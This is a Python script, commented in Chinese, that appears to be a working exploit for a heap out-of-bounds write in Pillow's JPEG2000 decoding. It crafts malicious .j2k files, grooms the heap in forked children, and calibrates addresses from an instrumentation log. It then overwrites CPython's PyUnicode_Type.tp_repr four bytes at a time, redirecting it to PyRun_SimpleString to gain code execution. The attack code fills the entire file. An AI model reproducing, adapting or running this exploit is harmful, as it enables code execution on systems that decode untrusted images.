#!/usr/bin/env python3
# 自动标定 + 四段写：
#   1) 每段先标定：反复调 A，直到日志里写入 comps(+584) 的值 == 我们的 FAKE
#   2) 标定成功后再跑最终那一次，写入就落到 PyUnicode_Type.tp_repr
import ctypes, gc, io, os, re, subprocess, sys
from PIL import Image

R = lambda a: ctypes.c_uint64.from_address(a).value
TP_REPR = 0xA3C908
VAL = 0x00451A9C
PAY = '/tmp/cp.j2k'
BUILT = '/tmp/cb.j2k'
HOLD = []


def low_buffer(n):
    for _ in range(64):
        b = bytearray(n)
        v = (ctypes.c_char * n).from_buffer(b)
        HOLD.append((b, v))
        a = ctypes.addressof(v)
        if a < 0x1000000:
            return b, a
    raise RuntimeError('no low buffer')


def put64(a, v):
    ctypes.c_uint64.from_address(a).value = v & 0xFFFFFFFFFFFFFFFF


def put32(a, v):
    ctypes.c_uint32.from_address(a).value = v & 0xFFFFFFFF


SCR_O, SCRATCH = low_buffer(8192)
RES_O, RESADDR = low_buffer(4096)
FAKE_O, FAKE = low_buffer(4096)
print("[*] SCRATCH=%#x RES=%#x FAKE=%#x" % (SCRATCH, RESADDR, FAKE))


def make_fake(target):
    put32(FAKE + 0x10, 0)
    put32(FAKE + 0x14, 0)
    put32(FAKE + 0x18, 0)
    put64(FAKE + 0x20, RESADDR)
    put64(FAKE + 0x28, 40)
    put64(FAKE + 0x30, target)
    put64(FAKE + 0x38, 0)
    put64(FAKE + 0x40, 4096)
    put64(FAKE + 0x48, 4096)
    put64(FAKE + 0x50, 0)
    put64(FAKE + 0x58, 0)
    put64(FAKE + 0x60, 0)
    put64(FAKE + 0x68, 0)
    put64(FAKE + 0x70, 256)


def build(byte_val, A):
    C = A + 0x8000
    code = ("import subprocess,sys\n"
            "from PIL import Image\n"
            "im = Image.new('L', (16,16))\n"
            "im.putdata([%d] + [0]*255)\n"
            "im.save(%r,'JPEG2000', tile_size=(8,8), num_resolutions=1)\n"
            "r = subprocess.run(['python3','/tmp/mk13.py',%r,%r,'0','23',%r,%r,%r,'-370'],\n"
            "                   capture_output=True,text=True)\n"
            "sys.stdout.write(r.stdout)\n" % (byte_val, PAY, PAY, BUILT, hex(A), hex(A + 0x1000), hex(C)))
    r = subprocess.run([sys.executable, '-c', code], capture_output=True, text=True)
    return (r.stdout or '').strip() or (r.stderr or '')[:70]


def run_child(path, logpath):
    """在 fork 的子进程里 groom+解码，stderr 落盘（插桩日志）"""
    pid = os.fork()
    if pid == 0:
        fd = os.open(logpath, os.O_WRONLY | os.O_CREAT | os.O_TRUNC)
        os.dup2(fd, 2)
        try:
            gc.collect()
            prime = [bytes(519) for _ in range(1024)]
            del prime
            pairs = [(bytes(519), bytes(bytearray(519))) for _ in range(400)]
            good = [(D, B) for (D, B) in pairs if id(B) - id(D) == 0x230]
            if good:
                keep = [t for i, t in enumerate(good) if i != len(good) // 2]
                Ks = [B for (D, B) in keep]
                holeD = good[len(good) // 2][0]
                del holeD, pairs, good
                gc.collect()
                M = open(path, 'rb').read()
                im = Image.open(io.BytesIO(M)); im.load()
        except BaseException:
            pass
        os._exit(0)
    os.waitpid(pid, 0)
    return open(logpath, errors='ignore').read()


def comps_written(log):
    """从 OOB 日志里取写到 +584 的值（= tile+0x18 = comps）"""
    v = None
    for ln in log.splitlines():
        m = re.search(r'write_at=\+584 val=(0x[0-9a-f]+)', ln)
        if m:
            v = int(m.group(1), 16)
    return v


print("[*] tp_repr 原值 = %#x   目标 = %#x" % (R(TP_REPR), VAL))
open('/tmp/progress3.log', 'w').close()

for stage in range(4):
    byte_val = (VAL >> (8 * stage)) & 0xFF
    make_fake(TP_REPR + stage)
    A = FAKE - 0x0c
    ok = False
    for attempt in range(8):
        out = build(byte_val, A)
        if 'OK' not in out:
            print("段%d build 失败 %s" % (stage + 1, out[:40])); break
        log = run_child(BUILT, '/tmp/cal%d.log' % stage)
        w = comps_written(log)
        if w is None:
            print("段%d attempt%d: 日志里没找到 +584 写入" % (stage + 1, attempt + 1)); continue
        if w == FAKE:
            ok = True
            print("段%d: 标定成功 A=%#x -> comps=%#x" % (stage + 1, A, w), flush=True)
            # 标定完再跑一次正式写入（同一次其实已经写了）
            break
        delta = FAKE - w
        A += delta
        print("段%d attempt%d: comps=%#x 差 %+#x -> 调 A 到 %#x"
              % (stage + 1, attempt + 1, w, delta, A), flush=True)
    line = "段%d byte=%#x 标定=%s tp_repr=%#x" % (stage + 1, byte_val, ok, R(TP_REPR))
    with open('/tmp/progress3.log', 'a') as f:
        f.write(line + "\n")
    print("[*] " + line, flush=True)

final = R(TP_REPR)
print()
print("[*] 最终 tp_repr = %#x   期望 = %#x" % (final, VAL))
if (final & 0xFFFFFFFF) == VAL:
    print("\n*** SUCCESS *** tp_repr = 0x451a9c (PyRun_SimpleString)")